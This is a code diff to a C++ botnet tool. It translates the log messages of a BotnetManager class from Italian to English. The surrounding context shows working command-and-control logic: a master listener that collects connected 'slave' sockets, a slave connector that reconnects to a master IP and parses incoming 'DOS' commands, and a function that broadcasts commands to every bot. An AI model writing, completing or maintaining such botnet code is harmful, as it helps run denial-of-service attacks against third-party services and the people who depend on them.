@@ -13,7 +13,7 @@ void BotnetManager::startMaster(int port, const std::string &password) {
     
     master_socket = socket(AF_INET, SOCK_STREAM, 0);
     if (master_socket < 0) {
-        Utils::logError("Impossibile creare socket master");
+        Utils::logError("Unable to create master socket");
         return;
     }
     
@@ -26,12 +26,12 @@ void BotnetManager::startMaster(int port, const std::string &password) {
     addr.sin_port = htons(port);
     
     if (bind(master_socket, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-        Utils::logError("Bind fallito sulla porta " + std::to_string(port));
+        Utils::logError("Bind failed on port " + std::to_string(port));
         return;
     }
     
     listen(master_socket, 10);
-    Utils::logSuccess("Botnet MASTER attivo sulla porta " + std::to_string(port));
+    Utils::logSuccess("Botnet MASTER active on port " + std::to_string(port));
     
     listener_thread = std::thread(&BotnetManager::masterListener, this);
 }
@@ -55,7 +55,7 @@ void BotnetManager::masterListener() {
             if (new_slave >= 0) {
                 std::lock_guard<std::mutex> lock(slaves_mutex);
                 slave_sockets.push_back(new_slave);
-                Utils::logSuccess("Nuovo SLAVE connesso! Totale: " + 
+                Utils::logSuccess("New SLAVE connected! Total: " + 
                     std::to_string(slave_sockets.size()));
             }
         }
@@ -83,7 +83,7 @@ void BotnetManager::slaveConnector() {
         inet_pton(AF_INET, master_ip.c_str(), &server_addr.sin_addr);
         
         if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
-            Utils::logSuccess("Connesso al MASTER " + master_ip + ":" + std::to_string(master_port));
+            Utils::logSuccess("Connected to MASTER " + master_ip + ":" + std::to_string(master_port));
             
             char buffer[4096];
             while (g_running && g_is_slave) {
@@ -91,7 +91,7 @@ void BotnetManager::slaveConnector() {
                 if (bytes > 0) {
                     buffer[bytes] = '\0';
                     std::string cmd(buffer);
-                    Utils::logWarning("Comando ricevuto: " + cmd);
+                    Utils::logWarning("Command received: " + cmd);
                     
                     if (cmd.find("DOS") == 0) {
                         auto parts = Utils::split(cmd, ' ');
@@ -102,12 +102,12 @@ void BotnetManager::slaveConnector() {
                         }
                     }
                 } else if (bytes == 0) {
-                    Utils::logWarning("Master disconnesso");
+                    Utils::logWarning("Master disconnected");
                     break;
                 }
             }
         } else {
-            Utils::logError("Connessione fallita, retry in 5s...");
+            Utils::logError("Connection failed, retrying in 5s...");
             sleep(5);
         }
         close(sock);
@@ -126,7 +126,7 @@ void BotnetManager::broadcastToSlaves(const std::string &cmd) {
             ++it;
         }
     }
-    Utils::logSuccess("Comando inviato a " + std::to_string(slave_sockets.size()) + " slave");
+    Utils::logSuccess("Command sent to " + std::to_string(slave_sockets.size()) + " slaves");
 }
 
 void BotnetManager::stop() {
